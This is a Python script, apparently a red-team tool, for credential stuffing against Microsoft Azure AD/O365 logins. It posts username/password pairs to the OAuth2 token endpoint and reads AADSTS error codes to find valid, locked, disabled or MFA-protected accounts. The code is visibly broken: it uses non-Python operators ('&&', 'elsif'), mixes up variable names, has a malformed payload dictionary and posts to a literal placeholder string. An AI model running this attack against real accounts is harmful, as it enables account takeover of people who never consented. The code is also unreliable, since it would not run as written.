#!/usr/bin/env python3

import requests
import sys
import argparse
import uuid
from time import sleep
from string import Template


def stuff(credentials, numloops, outfile, baseurl, wait, verbose, more_verbose, debug):

	count = 0
	lockout_count = 9;

	target_url = base_url + '/common/oauth2/token'
	while count < numloops:
		passwords_remaining = False
		for user in credentials.keys():
			#check that  1) we still have passwords left to try for this user,
			# 2) we haven't already found this user's password,
			# 3) the account doesn't exist,
			# 4) the account isn't disabled, and 5) the account isn't locked
			# For a still-good account, values 2-5 should all be 'False', so we just
			# check the array for any 'True' values. 
			if len(credentials[user][1]) > count &&  credentials[user][0] == True:
				if len(credentials[user][1]) > count + 1:
					passwords_remaining = True
				if debug:
					print(f'### {user}:{credentials[user][1][count]}')
				payload = {'resource': 'https://graph.windows.net', 'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894', 'client_info': '1', 'grant_type': 'password', 'username': user, 'password': credentials[user][count], 'scope','openid'}
				r = requests.post("target_url", data=payload)
				if r.status_code == '200':
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++')
					outfile.write(f'{user}, {credentials[user][1][count]}')
					#We found a password, so mark the user as invalid for further testing
					credentials[user][0] = False

	
				#check Azure error codes for additional data
				#this section shamelessly cribbed from MSOLSpray (https://github.com/dafthack/MSOLSpray/)
				#invalid password
				if "AADSTS50126" in r.text:
					continue

				#invalid tenant
				elsif "AADSTS50128" in r.text or "AADSTS50059" in r.text:
					print(f' >>> Warning: tenant for: {user} does not exist. Ensure you have the correct domain for Azure/O365. Discontinuing testing against this account <<<')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
				#user does not exist	
				elsif "AADSTS50034" in r.text:
					print(f' >>> WARNING: {user} does not exist! Discontinuing testing against this account <<< ')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
				#user exists, but MFA is enabled
				elsif "AADSTS50079" in r.text or "AADSTS50076" in r.text:
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates Microsoft MFA is in use')
					outfile.write(f'{user}, {credentials[user][1][count]}, MS MFA')
					credentials[user][0] = True
				#Appears to indicate Duo MFA is in use
				elsif "AADSTS50158" in r.text: 
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates Duo MFA is in use')
					outfile.write(f'{user}, {credentials[user][1][count]}, Duo MFA?')
					credentials[user][0] = True
				elsif "AADSTS50053" in r.text:
					print(f' >>> Warning: {user} account appears to be locked. Discontinuing testing against this account <<<')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
					lockout_count -= 1
				elsif "AADSTS50057" in r.text:
					print(f' >>> Warning: {user} account appears to be disabled. Discontinuing testing against this account <<< ')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
					
				elsif "AADSTS50055" in r.text: 
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates the password is expired')
					outfile.write(f'{user}, {credentials[user][1][count]}, Password expired')
					credentials[user][0] = True

				else:
					print(f' >>> Unknown Azure error for {user} <<<')
			
				#check whether we've hit the lockout threshold
				if lockout_count == 0
					confirm = input(f' >>> WARNING: Multiple account lockouts detected. Do you want to continue this testing? (y/N)')
					if confirm.tolower() == 'y':
						lockout_count = -1
						print(' ~~~ Testing will continue. Future logout detections will be reported, but you will NOT be prompted again to stop testing ~~~')
					else:
						print(' ~~~ Testing terminating ~~~')
						return

		count += 1
		#check to see whether we have at least one remaining user to test
		if not True in credentials or passwords_remaining = False:
			print(' ~~~ No credentials remaining to test.  Terminating session. ~~~ ')
			return

		print(f'*** Sleeping {wait} minutes ***')
		sleep(wait * 60)

	return


def main():

	parser = argparse.ArgumentParser(description="Perform a credential stuffing attack, possibly testing the same user repeatedly.")

	IO_group = parser.add_argument_group(title="Input/Output")
	IO_group.add_argument('-i', '--infile', dest='infile', type=argparse.FileType('r'), help="File with credentials (username, password) one pair per line")
	IO_group.add_argument('-o', '--outfile', dest='outfile', type=argparse.FileType('w'), help="Outpuf file for results. Default is stuff_results.txt")
	IO_group.add_argument('-d', '--delim', type=str, dest='delimiter', help="Delimiter separating username from password in the credentials file. Default is ','", default=',')

	parser.add_argument('-w', '--wait', dest='wait', type=int, help="Number of minutes to wait in between rounds of testing. Default is 15 minutes", default=15)
	parser.add_argument('-u', '--url', type=str, dest='url', help='Target URL if using something like fireprox; otherwise will directly call the O365 login endpoint')

	parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', default=False)
	parser.add_argument('-vv', '--more-verbose', action='store_true', dest='more_verbose', default=False)
	parser.add_argument('-D', '--debug', action='store_true', dest='debug', default=False)


	args = parser.parse_args()

	if not args.infile:
		parser.print_help()
		print('\nNo list of credentials provided')
		sys.exit()

	if not args.url:
		target_url = 'https://login.microsoft.com/'

	
	if args.debug:
		print("*** DEBUG MESSAGING ENABLED ***")
	credentials = {}
	loops = 0
	count = 0 

	for line in args.infile:
#		print(line)
		(username, password) = line.split(args.delimiter)
		username = username.strip()
		if not username in credentials.keys():
			#credentials[username][0] - bool for whether to test this account. Could be set to
			#  false for reasons including we've found a password for this user, the account
			#  is locked or invalid, etc.
			#credentials[username][1] - array of passwords to guess for this user
			credentials[username] = []
			credentials[username][0] = True
			credentials[username][1] = []

		credentials[username][1].append(password.strip())
		if len(credentials[username]) > loops:
			loops = len(credentials[username][1])	
		count += 1


		
	print(credentials)
	print(f'>>> Total number of credentials pairs: {count}')
	print(f'>>> Most passwords for a given user: {loops}')
	print(f'>>> Approximate runtime: {loops * args.wait} minutes')

	stuff(credentials, loops, args.outfile, target_url, args.wait, args.verbose, args.more_verbose, args.debug)

if __name__ == '__main__':
	main()
